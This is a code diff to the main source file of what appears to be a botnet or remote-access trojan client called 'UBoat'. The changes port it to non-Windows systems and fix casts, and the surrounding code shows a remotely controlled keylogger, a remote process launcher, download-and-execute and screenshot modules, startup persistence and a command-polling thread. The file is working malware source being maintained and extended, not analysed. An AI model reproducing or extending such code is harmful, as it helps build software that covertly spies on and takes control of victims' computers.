@@ -1,5 +1,5 @@
 #include "HttpQuery.h"
-#include "AggressiveOptimize.h" 
+#include "AggressiveOptimize.h"
 #include "Gate.h"
 #include "SocketInit.h"
 #include "WebSafeEncryption.h"
@@ -24,8 +24,13 @@
 #include "DownloadExecute.h"
 #include "Screenshot.h"
 #include "Startup.h"
-#include <Windows.h>
+#include "WindowsCompat.h"
+#ifdef __WIN32
 #include <WinBase.h> // sleep function extra
+#else
+#include <unistd.h>
+#define Sleep(millis) sleep(millis/1000)
+#endif
 
  bool continuePolling = true;
 
@@ -51,7 +56,7 @@ int GetEventIndex(PostPollDelegate proc) {
 bool AddEvent(PostPollDelegate proc) {
 	int existing = GetEventIndex(proc);
 	if (existing != -1) return true;
-	
+
 	if (event_count == 500) return false;
 	Events[event_count] = proc;
 	event_count++;
@@ -83,17 +88,17 @@ void KeylogFlushEvent() {
 	FreeFlushKeylogBufferResult(result);
 }
 
-void KeylogParser(int commandId, int commandType, char* data) 
+void KeylogParser(int commandId, int commandType, char* data)
 {
 	char* responsedata;
 	if (strcmp(data, "start") == 0) {
 		bool res = StartLogger();
-		responsedata = res ? "true" : "false";
+		responsedata = (char *)(res ? "true" : "false");
 		if (res) AddEvent(KeylogFlushEvent);
 	}
 	else if (strcmp(data, "stop") == 0) {
 		bool res = StopLogger();
-		responsedata = res ? "true" : "false";
+		responsedata = (char *)(res ? "true" : "false");
 		if (res) RemoveEvent(KeylogFlushEvent);
 	}
 	else {
@@ -175,11 +180,11 @@ void RemoteProcessNoResultParser(int commandId, int commandType, char* data)
 	char* command;
 
 	if (len == 2) {
-		char* result = StartProcess(splitResults[0], strlen(splitResults[1]) ? splitResults[1] : NULL) ? "true" : "false";
+		char* result = (char *)(StartProcess(splitResults[0], strlen(splitResults[1]) ? splitResults[1] : NULL) ? "true" : "false");
 		command = CreateCommand(commandId, commandType, result, strlen(result));
 	}
 	else if(len == 1) {
-		char* result = StartProcess(splitResults[0], "") ? "true" : "false";
+		char* result = (char *)(StartProcess(splitResults[0], "") ? "true" : "false");
 		command = CreateCommand(commandId, commandType, result, strlen(result));
 	}
 	else {
@@ -391,10 +396,10 @@ void InitializePollThread()
 
 }
 
+#if defined(__WIN32)
 int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
 
 {
-	
 	HANDLE hThread = NULL;
 	DWORD dwThreadId = NULL;
 
@@ -420,3 +425,13 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
 	SocketCleanup();
 	return 0;
 }
+#else
+int main(int argc, char const *argv[]) {
+#ifdef _DEBUG_
+    printf("[+] Starting UBoat...\n");
+#endif _DEBUG_
+    InitializeParsers();
+	InitializePollThread();
+    return 0;
+}
+#endif
